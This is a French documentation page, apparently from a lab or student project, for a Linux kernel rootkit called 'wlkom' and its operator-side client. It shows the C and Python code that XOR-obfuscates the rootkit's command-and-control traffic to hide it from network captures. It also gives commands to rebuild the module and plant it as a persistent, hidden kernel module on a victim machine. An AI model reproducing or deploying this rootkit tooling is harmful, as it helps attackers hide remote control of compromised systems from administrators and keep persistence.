# Chiffrement des communications

---

## Objectif

Toutes les communications entre le rootkit et le programme attaquant transitaient initialement **en clair** sur le réseau. Un administrateur réseau ou un outil de capture (Wireshark, tcpdump) pouvait lire les commandes et réponses échangées.

```bash
# Visible sur le réseau sans chiffrement :
# "AUTH wlkom\n"
# "OK authenticated\n"
# "INFO\n"
# "sysname=Linux release=5.15.0-78-generic machine=x86_64\n"
```

---

## Implémentation

Un **XOR** avec une clé pré-partagée obfusque tous les octets échangés sur le canal TCP.

### Côté kernel (`rootkit/src/connection.c`)

La clé est définie en dur via un `#define` :

```c
#define WLKOM_XOR_KEY "wlkom"
```

La fonction `wlkom_xor_buffer()` XOR chaque octet du buffer avec la clé répétée en boucle :

```c
static void wlkom_xor_buffer(char *data, size_t len) {
  const char *key = WLKOM_XOR_KEY;
  size_t key_len = strlen(key);
  size_t i;

  for (i = 0; i < len; i++)
    data[i] ^= key[i % key_len];
}
```

Elle est appelée :

- **avant** `kernel_sendmsg` (chiffrement à l'envoi)
- **après** `kernel_recvmsg` (déchiffrement à la réception)

### Côté Python (`attacking_program/main.py`)

La clé est chargée depuis `~/.config/wlkom/auth` au démarrage (configurée au premier lancement) :

```python
def xor_bytes(data):
    return bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data))
```

Elle est appliquée :

- **avant** `sendall` (chiffrement à l'envoi)
- **après** `recv` (déchiffrement à la réception)

---

## Utilisation

Le chiffrement est **entièrement automatique et transparent** : aucune commande CLI n'est nécessaire pour l'activer.

Il se met en place en deux temps :

**Au premier lancement du programme attaquant** (`rootkit`), la clé XOR est demandée interactivement :

```
XOR key [default: wlkom]:
```

Elle est stockée dans `~/.config/wlkom/auth` et rechargée à chaque lancement suivant.

**Au chargement du module** (`sudo insmod wlkom.ko` sur la VM victime), la clé est compilée en dur dans le module. Dès la première connexion TCP, tous les octets échangés sont automatiquement XOR'd des deux côtés : commandes comme réponses.

!!! note "Aucune commande CLI dédiée"
Il n'existe pas de commande `CIPHER` ou `ENCRYPT` dans le protocole. Le chiffrement s'applique à l'intégralité du trafic dès la connexion, de manière transparente.

---

## Changer la clé XOR

!!! warning "La clé doit être identique des deux côtés"
Si les deux côtés utilisent des clés différentes, toutes les communications sont corrompues.

### Côté kernel

Modifiez la ligne suivante dans `rootkit/src/connection.c` :

```c
#define WLKOM_XOR_KEY "ma_nouvelle_cle"
```

Puis recompilez et déployez sur la VM victime :

```bash
# Sur la VM victime
make module

# Remplace le fichier de persistance par la nouvelle version compilée
sudo cp ~/rootkit/wlkom.ko /lib/modules/$(uname -r)/kernel/drivers/misc/wlkom.ko
sudo depmod

# Redémarre pour que le nouveau module soit chargé
sudo reboot
```

!!! note "Pourquoi reboot ?"
Le module étant caché en mémoire une fois chargé, `sudo insmod` échoue. Il faut remplacer le fichier de persistance et redémarrer pour que le nouveau module (avec la nouvelle clé) soit chargé. En développement, `make reset` sur la VM victime est plus rapide.

### Côté programme attaquant

La clé XOR est demandée interactivement **au premier lancement** de `rootkit` :

```
XOR key [default: wlkom]: ma_nouvelle_cle
```

Elle est stockée dans `~/.config/wlkom/auth`. Pour la modifier après le premier lancement, supprimez ce fichier et relancez `rootkit` :

```bash
rm ~/.config/wlkom/auth
rootkit
```

Le programme reconfigure credentials et clé XOR depuis zéro.

---

## Limites

!!! note "XOR à clé répétée"
Le XOR à clé répétée reste faible contre une analyse de fréquence si la clé est courte. Il suffit cependant à rendre le trafic illisible dans un dump réseau basique (Wireshark, tcpdump).
